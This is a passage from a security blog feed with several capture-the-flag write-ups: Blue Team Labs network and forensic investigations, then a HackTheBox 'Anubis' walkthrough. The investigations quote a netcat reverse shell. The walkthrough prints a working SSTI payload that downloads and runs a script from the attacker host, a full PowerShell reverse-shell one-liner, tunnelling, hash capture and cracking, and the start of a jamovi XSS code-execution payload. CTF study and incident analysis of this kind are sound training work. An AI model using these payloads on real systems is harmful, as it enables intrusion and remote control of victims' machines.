reconnaissance but they were unable to read the traffic as it was encrypted. Pcap files and analysis tools are available on the Desktop. Please note there any no issues with this lab – if you encounter a problem, try to solve it!The BeginningWe’re supposed to use two tools that are made available for us, Wireshark and Network Miner. There are two PCAPNG files and sslkeylog.txt.Let’s start with Tool named Network Miner. If we’d like to load PCAPNG it won’t work. What to do? Open 1.pcapng and 2.pcapng in Wireshark and save them as .pcap and file should open in Network Miner.Checking Anomalies found by Network MinerI’ve merged both files togheter into 3.pcap. Network Miner has found some anomalies, mostly speculating on EternalBlue. If we check the Frame in the Wireshark and follow TCP Stream we’ll see it’s running SMB above. According to Network Miner, what exploit attempt is being made on what protocol? (5 points): EternalBlue, SMBChecking Network Miners ParametersIf we check Parameters and search for NMAP, we’d find NMAP hiding as value of SMB Native OSs paramenters. What is the IP address of the machine responsible that is conducting network scanning using Nmap? (5 points): 172.16.0.5Finding Command and ControlIn order to find the C2C server i tend (at the moment) to check statistics first. Now this may not always be possible if there’s a lot of traffic, and if that would be the case, more filtering would need to be done.Two ports stick out, the first is 4444 which we know already from before (EternalBlue) and second one is 4782.Checking the packets, we can see that it’s running on TLS and it’s encrypted. If we check the Certificate we can see that there is no certificate chain and CA os some Quasar Server CA.It’s weird connection to have in the internal/private network so it’s definately suspicious. Googling Quasar Server CA confirms the suspicious - first hit is some post on twitter:We can see that filtering on Recieved Packets (Descending) the IP ranks pretty high. Identify the Command-and-Control server. What is the hostname, MAC address, and listening port numbers? (5 points): IE11WIN8_1, 080027FEEC1E, 139, 4782SSL/TLS Decryption - how?Useful read: https://www.comparitech.com/net-admin/decrypt-ssl-with-wireshark/Pre-master secret Keys were exported for us in sslkeylog.txt and we can import them and decrypt SSL/TLS in WiresharkAs credentials are usually sent over HTTP POST we can make use ofhttp.request.method==&quot;POST&quot;We can make use of filter just by CTRL+F What are the banking credentials of the victim? (5 points): christiww007, christismoneyworld$$Network Miners - Credentials foundChecking the credentials tab, there’re few hits:What is the observed NTLM Response for the challenge from VICTIM Machine (5 points): 46E55566E4DF5613" }, { "title": "(BTLO/Investigation) - Pretium", "url": "/posts/Pretium/", "categories": "BlueTeamLabs, Incident Response", "tags": "Tshark, Wireshark, CyberChef", "date": "2022-04-08 18:33:00 +0200", "snippet": "The Security Operations Center at Defense Superior are monitoring a customer’s email gateway and network traffic (Crimeson LLC). CTF is hosted on https://blueteamlabs.online/ Scenario PCAP Analysis Export Objects (HTML) Let us open the LAB.pcap in Wireshark and let’s export HTML objects withExport Objects &amp;gt; HTML We can see pdf.bat file that’s being downloaded, which apperas to be our initial payload file What is the full filename of the initial payload file?: INVOICE_2021937.pdf.batThis information can be found in the HTTP header. I’ve used this python’s module a lot, otherwise google would tell it is SimpleHTTPServer What is the name of the module used to serve the malicious payload?: SimpleHTTPServerAnalysing the traffic, what is the attacker’s IP address?: 192.168.1.9Now that you know the payload name and the module used to deliver the malicious files, what is the URL that was embedded in the malicious email?: http://192.168.1.9:443/INVOICE_2021937.pdf.batDecoding in CyberChefFollow the Packet as HTTP Stream Find the PowerShell launcher string (you don’t need to include the base64 encoded script): powershell -noP -sta -w 1 -encTo see what that obfuscated command is all about, let’s throw it into CyberChefSo i used Base64 + Regex. Copied that back into Input and apply Generic Code Beautify What is the default user agent being used for communications? Mozila 5/0You are seeing a lot of HTTP traffic. What is the name of a process where malware communicates with a central server asking for instructions at set time intervals?beaconingContinuing with PCAP AnalysisUse either Find in Packet or use http Filter and scroll. What is the URI containing ‘login’ that the victim machine is communicating to?: /login/process.phpWhat is the name of the popular post-exploitation framework used for command-and-control communication?: Empire Checking for exfiltration So we know the Attacker’s IP. Lets filter that out and check Protocol Hierarchy StatisticsWe can see that basically there’s only HTTP and ICMP where ICMP definately stands out. So let’s apply ICMP as filterTo check what’s being sent into requests (we are assuming exfiltration) we need to use TSHARK. So let’s use it and filter only Requests, outputing datatshark.exe -r C:\\Users\\BTLOTest\\Desktop\\Investigation\\LAB.pcap -Y &quot;icmp.type==8&quot; -T fields -e data Since this outputs HEX, let’s put output into the fileC:\\Program Files\\Wireshark&amp;gt;tshark.exe -r C:\\Users\\BTLOTest\\Desktop\\Investigation\\LAB.pcap -Y &quot;icmp.tCopy and paste that into CyberChef and apply. From Hex From Base64 and Regex It is believed that data is being exfiltrated. Investigate and provide the decoded password: Y0uthinky0ucAnc4tchm3$$What is the account’s username?: $sec-account" }, { "title": "(BTLO/Investigation) - Bad Logic", "url": "/posts/Bad_Logic/", "categories": "BlueTeamLabs, Digital Forensics", "tags": "EventViewer, Wireshark, TShark, MFTExplorer, CLI", "date": "2022-04-01 18:33:00 +0200", "snippet": "During standard servicing &amp;amp; patching of our server the sysadmins were denied access to their Administrator account. CTF is hosted on https://blueteamlabs.online/ Scenario During standard servicing &amp;amp; patching of our server the sysadmins were denied access to their Administrator account. Bad practices are in place here and it seems they run all services with the account they logon with. Investigate if this server has been compromised and if it has, uncover what actions-on-objectives the threat actor has completed. Remember, some of the artefacts may have been deleted. A PCAP, memory dump, MFT &amp;amp; pre-fetch files may be of assistance. A full review of the compromised application may also be in order. PCAP Analysis with WiresharkLet’s start with PCAP. We do know that there is an application which probably runs on a webserver. Apart from that, we know IPs and netstat output which can be found in the KAPE’s output.(As PCAP is very big since it was ran over 1 whole week, you can run it with filter). Change the view of the time display to show actual time and date.Amount of HTTP packets ist still pretty big, so either we get a list of requests that were made, like putting Request URI to the column list. (as seen in the screenshot above) OR filter on ip.src==172.31.4.99 for which can we know that it is the IP of the web server. There is ipconfig output in one of the artifacts!Let’s also filter on HTTP POST and GET and see what we get. First of all, we end up with 121 packets, and 178.62.72.123 appears suspicious right away. First we would find NMAP scan (e.g. Packet 1113452) and then something that looks like payload.Checking Google, just with pasting the payload used, we do get what CVE might have been exploited and in which application (WebLogic). Which application did the threat actor exploit, what port does this run on and which CVE did the threat actor utilise? (10 points): Application WebLogic runs on Port 7001 and CVE exploited appears to be CVE-2020-14882If we analyze Conversation statistics in Wireshark, we get only 3 hits! (use Limit to display filter)Taking another look at the Conversation statistics is only by using ip.dst==172.31.4.99 and limiting results to the filter, we see that port 3389 is being used extensievly as well. Two IP’s have used RDP with the box which are 82.16.6.12 and 95.181.232.7 nd will be checked later.So, let’s return to RCE exploit and check Wiresharks output for ip.addr==172.31.4.99 &amp;amp;&amp;amp; ip.addr==178.62.72.123 &amp;amp;&amp;amp; httpFinding nc.exe seems like a good find. It has got downloaded right after payload was sent to the web server. What was the name of the malicious file they downloaded using this windows executable? (10 points): nc.exeWe can assume that 172.31.4.99 could have downloaded nc.exe from 178.62.72.123 (Host: advertyzing.co.uk:443). What is the malicious domain used by the threat actor? (10 points): advertyzing.co.uk The threat actor has made good use of ‘Living off the land’ binaries (LOLBins). Which windows executable did they use to download a malicious file from their server? (10 points): Certutil.exeIn the packet 1158260 we can see that command was issued to achieve reverse shell nc.exe advertyzing.co.uk 443 -e powershell.exe on 17.38.54.749676 so let’s turn the filter around in order to possibly find if Netcat revershe shell connection was indeed successful and which commands were ran (…hoping for unencrypted traffic between our server and threat actor…) Filter user: ip.src==172.31.4.99 &amp;amp;&amp;amp; ip.dst==178.62.72.123 &amp;amp;&amp;amp; tcp.port==443In one of the last TCP packets we can see that local Administrator’s password was changed.Session stops here which is interessting. Attacker has now persistence and we know that RDP and WINRM are running. (this can actually be seen in the netcats’ output or check KAPE’s output from netstat)Now recall(!) we’ve saw connections on RDP/TCP3389 from two IP-Adresses 82.16.6.12 and 95.181.232.7 so let’s have a look in the wireshark. Filter: ip.dst==172.31.4.99 &amp;amp;&amp;amp; tcp.port==3389 &amp;amp;&amp;amp; (ip.src==82.16.6.12 || ip.src==95.181.232.7) as 82.16.6.12 has used RDP before and 95.181.232.7 used RDP shortly after attack, this one should be in our focus. Since RDP is encrypted there’s not much to see in the PCAP itself apart from this packet.Let’s also not forget the time of the first access that we’ve saw in the PCAP. Confirm the two IP addresses utilized by the threat actor (10 points): 178.62.72.123,95.181.232.7One useful thing (which is not encrypted) could be checking DNS requests in PCAP however output will be lengthy and we do have DNS Requests logged in the KAPE’s output. Just something to keep in mind if checking more than host.PCAP Analysis ends here.Artifact AnalysisSo, the assumption now is that attacker used RDP using Administrator’s account from 95.181.232.7. Let’s check if we can find that in the Event Logs (Security).To navigate, i’ll use powershell and gci -Path C:\\ -Name Security.evtx -Recurse to find the EventFile although it can be found in the default location Target_Options\\C\\Windows\\System32\\winevt\\logs\\Security.evtx.EvtxECmd.exeTo avoid checking Event Logs in the Event Explorer, let’s rather do it in Timeline after parsing Events using EventxECmd.exeC:\\Users\\BTLOTest\\Desktop\\Tools\\EvtxExplorer\\EvtxECmd.exe -f C:\\Users\\BTLOTest\\Desktop\\MD-Artefacts\\Target_Options\\C\\Windows\\System32\\winevt\\logs\\Security.evtx --csv C:\\Users\\BTLOTest\\Desktop\\MD-Artefacts\\security_evtxOpening output in Timeline Explorer and filtering on IP we can see that Login was successful.Checking PS ConsoleHost_historyChecking Console history may be a quick win for us, if threat actor ran commands through powershell and didn’t clean the history afterwards.Apart from the legitimate output, threat actor ran lazagne credential dump program using powershell. What is the name of the password dumping tool used by the threat actor? (10 points): lazagneFrom here we will be checking AmCache which serves for application compatibility through different Windows versions and leaves artifacts behind.Checking AmCachecat .\\20210304223141_Amcache_AssociatedFileEntries.csv | ConvertFrom-Csv -delimiter &quot;,&quot; |out-gridviewWe can see that there’s program installed named Kryptex. What is Kryptex Get paid for the computing power of your PC. Kryptex mines cryptocurrency and pays you bitcoins or real-world money. Source: https://www.kryptex.orgThere we also have an answer to this question The threat actor has used an off-the-shelf cryptominer, what is the name of the executable? (10 points): kryptex.exe What is the name of the text file the TA echo’ed out to? (10 points): password_extract.txtChecking MFT using Timeline ExplorerMFT should give us information about File System (File Creation, Deletion, Renaming etc.), however there are two Hives, J and MFT. Do check this video to get an approximate idea what MFT is: https://www.youtube.com/watch?v=_qElVZJqlGY&amp;amp;t=635sChecking 20210304223305MFTECmd$J_Output.csvFilePath: C:\\Users\\BTLOTest\\Desktop\\MD-Artefacts\\Module_Options\\FileSystem\\20210304223305_MFTECmd_$J_Output.csvWe know approximate Time of login, so let’s start there. Filter the date.If any files were dropped to disk we should see that filtering Update Reasons with FileCreate but we’re still left of with many entries. Maybe grouping the Extensions and checking the interesting ones might work.By scrolling a little bit, there we can find kryptex.exe, lasagne.exe, elevate.exe.Under .bat we can find StartWebLogic.batNow since i haven’t been able to filter the data the way i wanted (after Date AND HOUR) i resorted to Linux Subsystem (type wsl in cmd). At first, i just wanted to get an idea what was ran after user logged in so i grepped everything after 19:40. Interessting files were .exe, .bat, .xml, which is why i drilled down to only unique values in the end. Command:grep -E &quot;2021-03-04 19:[4-5][0-9]&quot; 20210304223305_MFTECmd_\\$J_Output.csv | awk -F&quot;,&quot; &#39;{print $8,$1}&#39; | sort -u -t &quot;,&quot; -k 1,1 | grep -E &quot;.xml|.exe|.bat&quot; | sort -uChecking 20210304223233MFTECmd$MFT_Output.csvFilePath: C:\\Users\\BTLOTest\\Desktop\\MD-Artefacts\\Module_Options\\FileSystem\\20210304223233_MFTECmd_\\$MFT_Output.csvgrep -a -E &quot;2021-03-04 18:[0-5][0-9]&quot; 20210304223233_MFTECmd_\\$MFT_Output.csv | awk -F&quot;,&quot; &#39;{print $20,$6,$7}&#39;One of the files that were changed is config.json. Below output in wsl and Timeline Explorer.File is still on disk What email address is associated with the threat actor? (10 points): bzuyxpdpphthhbvxpz@niwghx.comSame could be found in the MEMdump, but it’s hard to predict where did the email came from.cat md-memdump.raw | strings | egrep -a &#39;\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,6}\\b&#39;Loading application Event LogsExtract the EVTX Logs into CSV using EvtxECmd:C:\\Users\\BTLOTest\\Desktop\\Tools\\EvtxExplorer\\EvtxECmd.exe -f C:\\Users\\BTLOTest\\Desktop\\MD-Artefacts\\Target_Options\\C\\Windows\\System32\\winevt\\logs\\Application.evtx --csv . --csvf applicationInteressting is following entry:Apparently Web Service was restarted using some sort of configuration file.Checking the C drive (not sure if intentional or not) startWebLogic.cmd is there, including startWebLogic.bat which was modified on the same dateGetting the file hash5DCF26E3FBCE71902B0CD7C72C60545B is nc.exe binary The threat actor has attempted an unusual way of persisting by editing a key file. Which configuration file have they altered? (10 points): startWebLogic.cmd" }, { "title": "Anubis", "url": "/posts/Anubis/", "categories": "HackTheBox, Windows", "tags": "Windows, Docker, Powershell, Injection, Command Injection, Weak Password, CVE", "date": "2022-03-14 17:33:00 +0100", "snippet": "Anubis is Windows box which introduces SSTI/XSS vulnerability for initial foothold in Docker, followed by Jamovi CVE and Exploiting AD CSEnumerationNMAPNMAP will be ran on all ports:Nmap scan report for 10.10.11.102Host is up, received user-set (0.034s latency).Scanned at 2022-03-08 12:38:44 GMT for 223sNot shown: 65531 filtered tcp ports (no-response)PORT STATE SERVICE REASON VERSION135/tcp open msrpc syn-ack Microsoft Windows RPC443/tcp open ssl/http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_ssl-date: 2022-03-08T13:50:35+00:00; +1h01m25s from scanner time.| tls-alpn: |_ http/1.1|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found| ssl-cert: Subject: commonName=www.windcorp.htb| Subject Alternative Name: DNS:www.windcorp.htb| Issuer: commonName=www.windcorp.htb| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2021-05-24T19:44:56| Not valid after: 2031-05-24T19:54:56| MD5: e2e7 86ef 4095 9908 14c5 3347 cdcb 4167| SHA-1: 7fce 781f 883c a27e 1154 4502 1686 ee65 7551 0e2a| -----BEGIN CERTIFICATE-----| MIIDLTCCAhWgAwIBAgIQGTQcHTu8XrtFZ6hwEkAoKTANBgkqhkiG9w0BAQsFADAb| MRkwFwYDVQQDDBB3d3cud2luZGNvcnAuaHRiMB4XDTIxMDUyNDE5NDQ1NloXDTMx| MDUyNDE5NTQ1NlowGzEZMBcGA1UEAwwQd3d3LndpbmRjb3JwLmh0YjCCASIwDQYJ| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAK79Y9DwPj7s4/vGfCx8Smiq921EsKI9| UQLB6ctOlXifp+YGwRKmDjPiRBsRaBcrQJyW8B3s8NKU1mt8dIX0bbn6gqBezeXg| cu+VXV/5HJmVQ5jxNe02NoY1l+5UBvmfpwRJmUvW+mO5dShhilDsNjPYYhydbme9| ap6UeFG7zwHfDKywUAFonbyxZcmFvaWUbbswNh0Hc0l7qAIddU8+O4azNNLzBgot| dstmd5PXMXtX4bdvupAV+PIhsu8ddsbSFAKxh7GLnmNDUv0/Jy1IQRfvpnjFNWAL| oeQzNmNnzCTNgoB9V7eAnPXCOLulq2geCaJ19WlYRrMc+lzIR/C4wB0CAwEAAaNt| MGswDgYDVR0PAQH/BAQDAgWgMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD| ATAbBgNVHREEFDASghB3d3cud2luZGNvcnAuaHRiMB0GA1UdDgQWBBQu0cbQ/zqK| aIeIy021WpVKOzBX8TANBgkqhkiG9w0BAQsFAAOCAQEAiyR1RyIWHuLR17cb45U+| 3rmflhQozUfNm1QMTGXQerX1s5p+Uw0rh7OdJe4VTE7smVPHiFJYzMlrvxl3p6Ur| UREF7ymW6NkriFZFSFKswHlWR9o5UwNG2QUAN8VjHBuOZT1LP8vgxRT290xh9G2w| i3Y3R5WA5FLYPYbNBJ7FZUbdMUkvQZI2DL9bd3ZLptqqlk/62kDrIRN2ctq8R6+c| C+h4MLd5L8Eoftf+5r1SrxTg3cD7ex2bm5cZmLhmtEYA6L1RkUPuf132Fb98URSE| +heFt1xpfM/EREhI+iwhFhTsDydrebtm9/HlxmDhd8OJqsFXmPWd6cw/llxONk9c| bA==|_-----END CERTIFICATE-----445/tcp open microsoft-ds? syn-ack593/tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1.049709/tcp open msrpc syn-ack Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3.1.1: |_ Message signing enabled and required| smb2-time: | date: 2022-03-08T13:44:00|_ start_date: N/A| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 33371/tcp): CLEAN (Timeout)| Check 2 (port 29705/tcp): CLEAN (Timeout)| Check 3 (port 30756/udp): CLEAN (Timeout)| Check 4 (port 46992/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked|_clock-skew: 1h02m08sWindows and running web server.The ports that seem most interessting after the first glance are 443 and 445, but let’s see…SMBCrackMapExecluka@kali:~$ crackmapexec smb 10.10.11.102SMB 10.10.11.102 445 EARTH [*] Windows 10.0 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)Computername should be EARTH, while being part of windcorp.htb Domain. SMB1 is not enabled while SMB signing is.SMBClientluka@kali:~$ smbclient -N -L //10.10.11.102Anonymous login successful Sharename Type Comment --------- ---- -------Reconnecting with SMB1 for workgroup listing.do_connect: Connection to 10.10.11.102 failed (Error NT_STATUS_IO_TIMEOUT)Unable to connect with SMB1 -- no workgroup availableluka@kali:~$ smbclient -U &#39;&#39; -L //10.10.11.102 Enter WORKGROUP\\&#39;s password: session setup failed: NT_STATUS_LOGON_FAILUREAnonymous login appears to be succesfull however we don’t get any share listing back.Add DNS Records to /etc/hostsSo let’s add following entries:10.10.11.102 www.windcorp.htb windcorp.htb earth earth.windcorp.htbWeb Server (Port 443)All requestes will be ran through Burp proxy, so i do recommend to have Burp or another proxy runningNow after enumerating a bit, it seems that there is contact form which accepts our input and actually does something with it.SSTI in ASPNow Hacktricks https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection has some information about ASP SSTI payloads which is exactly what we need If we pay attention where request goes to after submiting the for, we would notice that it goes to https://www.windcorp.htb/preview.asp, so we’re dealing with ASP.Let’s try the payloadSo there we have it! Contact form is vulnerable to SSTI,Initial Foothold exploiting SSTI on webserver01We will use following payload for SSTI in order to get shell. Payload is VB Script.&amp;lt;%= CreateObject(&quot;Wscript.Shell&quot;).exec(&quot;powershell IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.17/shell.ps1&#39;)&quot;).StdOut.ReadAll() %&amp;gt;Shell ps1 will be simple PS TCP Oneliners$client = New-Object System.Net.Sockets.TCPClient(&quot;10.10.14.17&quot;,8081);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&amp;gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()If everything has been done right, shell should pop on webserver01So we are NT AUTHORITY/SYSTEM however in a Docker environment, so that’s not the end! :)Enumeration - webserver01So we’ve got onto webserver01 and as it appears, we’re in some kind of Docker Container.Every request sent to www.windcorp.htb (or better said, every request sent to that server) it get’s routed in the backend.We can see that if try to reach www.windcorp.htb and then some not existing page.If we check ipconfigs output, we can try enumerate the gatewayPS C:\\windows\\system32\\inetsrv&amp;gt; ipconfigWindows IP ConfigurationEthernet adapter vEthernet (Ethernet): Connection-specific DNS Suffix . : htb Link-local IPv6 Address . . . . . : fe80::5c15:5d65:b73:c84a%32 IPv4 Address. . . . . . . . . . . : 172.27.199.150 Subnet Mask . . . . . . . . . . . : 255.255.240.0 Default Gateway . . . . . . . . . : 172.27.192.1Also arp -a doesn’t show any other hosts on layer2 (MAC)PS C:\\windows\\system32\\inetsrv&amp;gt; arp -aInterface: 172.27.199.150 --- 0x20 Internet Address Physical Address Type 172.27.192.1 00-15-5d-f2-84-be dynamic 224.0.0.22 01-00-5e-00-00-16 static 224.0.0.251 01-00-5e-00-00-fb static 224.0.0.252 01-00-5e-00-00-fc static There is CSR present in Administrator’s Desktop folderPS C:\\Users\\Administrator\\Desktop&amp;gt; type req.txt-----BEGIN CERTIFICATE REQUEST-----MIICoDCCAYgCAQAwWzELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxETAPBgNVBAoMCFdpbmRDb3JwMSQwIgYDVQQDDBtzb2Z0d2FyZXBvcnRhbC53aW5kY29ycC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCmm0r/hZHCKsK/BD7OFdL2I9vF8oIeahMS9Lb9sTJEFCTHGxCdhRX+xtisRBvAAFEOuPUUBWKbBEHIH2bhGEfCenhILl/9RRCuAKL0iuj2nQKrHQ1DzDEVuIkZnTakj3A+AhvTPntLeEgNf5l33cbOcHIFm3C92/cf2IvjHhaJWb+4a/6PgTlcxBMne5OsR+4hc4YIhLnzQMoVUqy7wI3VZ2tjSh6SiiPU4+Vg/nvx//YNyEas3mjA/DSZiczsqDvCNM24YZOqqmVIxlmQCAK4Wso7HMwhaKlue3cu3PpFOv+IJ9alsNWt8xdTtVEipCZwWRPFvGFu1x55Svs41Kd3AgMBAAGgADANBgkqhkiG9w0BAQsFAAOCAQEAa6x1wRGXcDBiTA+HJzMHljabY5FyyToLUDAJI17zJLxGgVFUeVxdYe0br9L91is7muhQ8S9s2Ky1iy2PWW5jit7McPZ68NrmbYwlvNWsF7pcZ7LYVG24V57sIdF/MzoR3DpqO5T/Dm9gNyOtyKQnmhMIo41l1f2cfFfcqMjpXcwaHix7bClxVobWoll5v2+4XwTPaaNFhtby8A1FF09NDSp8Z8JMyVGRx2FvGrJ39vIrjlMMKFj6M3GAmdvH+IO/D5B6JCEE3amuxU04CIHwCI5C04T2KaCN4U6112PDIS0tOuZBj8gdYIsgBYsFDeDtp23g4JsR6SosEiso4TlwpQ==-----END CERTIFICATE REQUEST-----We can see that it gives us another Virtual Host that we’ll check later softwareportal.windcorp.htbAdd it to the /etc/hosts file and point it to 172.27.192.1luka@kali:~/htb/anubis$ openssl req -in cert -noout -textCertificate Request: Data: Version: 1 (0x0) Subject: C = AU, ST = Some-State, O = WindCorp, CN = softwareportal.windcorp.htb Subject Public Key Info: Public Key Algorithm: rsaEncryption RSA Public-Key: (2048 bit) Modulus:Setting up Proxy / ChiselLink:iwr http://10.10.14.17/chisel-x64.exe -out chisel-x64.exeStart chisel.\\chisel-x64.exe client 10.10.14.17:8080 R:2080:socksNMAP 172.27.192.1luka@kali:~$ sudo proxychains -q nmap -sT -sV --top-ports 20 172.27.192.1Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-09 15:53 GMTRTTVAR has grown to over 2.3 seconds, decreasing to 2.0RTTVAR has grown to over 2.3 seconds, decreasing to 2.0RTTVAR has grown to over 2.3 seconds, decreasing to 2.0RTTVAR has grown to over 2.3 seconds, decreasing to 2.0RTTVAR has grown to over 2.3 seconds, decreasing to 2.0Nmap scan report for 172.27.192.1Host is up (0.087s latency).PORT STATE SERVICE VERSION21/tcp closed ftp22/tcp closed ssh23/tcp closed telnet25/tcp closed smtp53/tcp open domain Simple DNS Plus80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)110/tcp closed pop3111/tcp closed rpcbind135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn143/tcp closed imap443/tcp closed https445/tcp open microsoft-ds?993/tcp closed imaps995/tcp closed pop3s1723/tcp closed pptp3306/tcp closed mysql3389/tcp closed ms-wbt-server5900/tcp closed vnc8080/tcp closed http-proxyService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsChecking SMB it is still the same machineluka@kali:~$ proxychains -q crackmapexec smb 172.27.192.1SMB 172.27.192.1 445 EARTH [*] Windows 10.0 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)Enumeration of softwareportal.windcorp.htbOpening the website in the browser through chisel tunnel won’t work, but there’s no problem getting the page back using curlluka@kali:~/htb/anubis$ proxychains -q curl softwareportal.windcorp.htb -n | head -n 20&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html lang=&quot;en&quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&quot;utf-8&quot; /&amp;gt; &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot; /&amp;gt; &amp;lt;meta name=&quot;description&quot; content=&quot;&quot; /&amp;gt; &amp;lt;meta name=&quot;author&quot; content=&quot;&quot; /&amp;gt; &amp;lt;title&amp;gt;Windcorp Software-Portal&amp;lt;/title&amp;gt; &amp;lt;!-- Favicon--&amp;gt; &amp;lt;link rel=&quot;icon&quot; type=&quot;image/x-icon&quot; href=&quot;assets/img/favicon.ico&quot; /&amp;gt; &amp;lt;!-- Font Awesome icons (free version)--&amp;gt; &amp;lt;script src=&quot;https://use.fontawesome.com/releases/v5.15.1/js/all.js&quot; crossorigin=&quot;anonymous&quot;&amp;gt;&amp;lt;/script&amp;gt; ... CLIP ...In order to get it work in a browser, you can add an upstream proxy in Burp.Page should now load, however it will get stuck, as there is no internet connectivity in order to fetch some scripts. I just stopped the page load and page loaded normally:There are few links on the page and after clicking on one of them, program will get installed “somewhere”Checking the link, there’s an ip adress there, which seems to belong to the victim/htb machine/container.http://softwareportal.windcorp.htb/install.asp?client=172.27.199.150&amp;amp;software=7z1900-x64.exeLet’s change the IP.http://softwareportal.windcorp.htb/install.asp?client=10.10.14.17&amp;amp;software=7z1900-x64.exeLet’s start Responder with sudo responder -I tun0 and send request above.Decoding the hash using netcatLet’s start hashcat and see if we can get the passwordhashcat -m 5600 ./hash /usr/share/wordlists/rockyou.txtSo there’s tha password for localadmin - Secret123Beyond webserver01Enumertion of SMB Shares using credentails on Earth machineluka@kali:~/htb/anubis$ crackmapexec smb 10.10.11.102 -u localadmin -p Secret123 --sharesSMB 10.10.11.102 445 EARTH [*] Windows 10.0 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)SMB 10.10.11.102 445 EARTH [+] windcorp.htb\\localadmin:Secret123 SMB 10.10.11.102 445 EARTH [+] Enumerated sharesSMB 10.10.11.102 445 EARTH Share Permissions RemarkSMB 10.10.11.102 445 EARTH ----- ----------- ------SMB 10.10.11.102 445 EARTH ADMIN$ Remote AdminSMB 10.10.11.102 445 EARTH C$ Default shareSMB 10.10.11.102 445 EARTH CertEnroll READ Active Directory Certificate Services shareSMB 10.10.11.102 445 EARTH IPC$ READ Remote IPCSMB 10.10.11.102 445 EARTH NETLOGON READ Logon server share SMB 10.10.11.102 445 EARTH Shared READ SMB 10.10.11.102 445 EARTH SYSVOL READ Logon server share So credentials work. There is also one share that isn’t standard named SharedLet’s take a closer look at Sharedluka@kali:~/htb/anubis$ smbclient -U &#39;localadmin&#39; \\\\\\\\10.10.11.102\\\\SharedEnter WORKGROUP\\localadmin&#39;s password: Try &quot;help&quot; to get a list of possible commands.smb: \\&amp;gt; dir . D 0 Wed Apr 28 15:06:06 2021 .. D 0 Wed Apr 28 15:06:06 2021 Documents D 0 Tue Apr 27 04:09:25 2021 Software D 0 Thu Jul 22 18:14:16 2021So there are two folders Documents and Software.Let’s see what’s insidesmb: \\Software\\&amp;gt; dir . D 0 Thu Jul 22 18:14:16 2021 .. D 0 Thu Jul 22 18:14:16 2021 7z1900-x64.exe N 1447178 Mon Apr 26 21:10:08 2021 jamovi-1.6.16.0-win64.exe N 247215343 Mon Apr 26 21:03:30 2021 VNC-Viewer-6.20.529-Windows.exe N 10559784 Mon Apr 26 21:09:53 2021 9034239 blocks of size 4096. 3093827 blocks available...CLIP...smb: \\Documents\\Analytics\\&amp;gt; dir . D 0 Tue Apr 27 18:40:20 2021 .. D 0 Tue Apr 27 18:40:20 2021 Big 5.omv A 6455 Tue Apr 27 18:39:20 2021 Bugs.omv A 2897 Tue Apr 27 18:39:55 2021 Tooth Growth.omv A 2142 Tue Apr 27 18:40:20 2021 Whatif.omv A 2841 Thu Mar 10 10:49:57 2022 9034239 blocks of size 4096. 3093827 blocks availableDownload Jamovi to local machine and installIn Software there are 3 exe files and in Documents\\Analytics we have 4 omv Files which belong to Jamovi Software. One of them is recent - Whatif.omv.Searching the internet, there’s seems to be vulnerability in Jamovi &amp;lt;=1.6.18: https://github.com/theart42/cves/blob/master/CVE-2021-28079/CVE-2021-28079.mdAccording to the .exe file found in Software folder, jamovi’s version should be 1.6.16.So the plan now is to grab the jamovi-1.6.16.0-win64.exe and Whatif.omv and put them to Windows box.#still in smbclient...smb: \\Documents\\Analytics\\&amp;gt; get Whatif.omvgetting file \\Documents\\Analytics\\Whatif.omv of size 2841 as Whatif.omv (19,5 KiloBytes/sec) (average 19,5 KiloBytes/sec)...smb: \\Software\\&amp;gt; get jamovi-1.6.16.0-win64.exegetting file \\Software\\jamovi-1.6.16.0-win64.exe of size 247215343 as jamovi-1.6.16.0-win64.exe (2294,1 KiloBytes/sec) (average 2291,1 KiloBytes/sec)...When files are on the Windows Machine, start the installer jamovi-1.6.16.0-win64.exe.Exploiting XSS Vulnerability in Jamovi 1.16After installation, open Jamovi and change the name of the column as shown in the screenshotAfter clicking on Data&amp;gt;Transform alert should pop up (or whatever your payload is supposed to do;))To exploit this, we can prepare .omv File, name it Whatif.omv and put it back to SMB Shared Share to see if there’s any user interaction present. Remember that XSS does not happen on the Server but the client side (although we assume client or script will open this file on the server!)This is content of jamovi.jsrequire(&#39;child_process&#39;).exec(&quot;powershell -enc 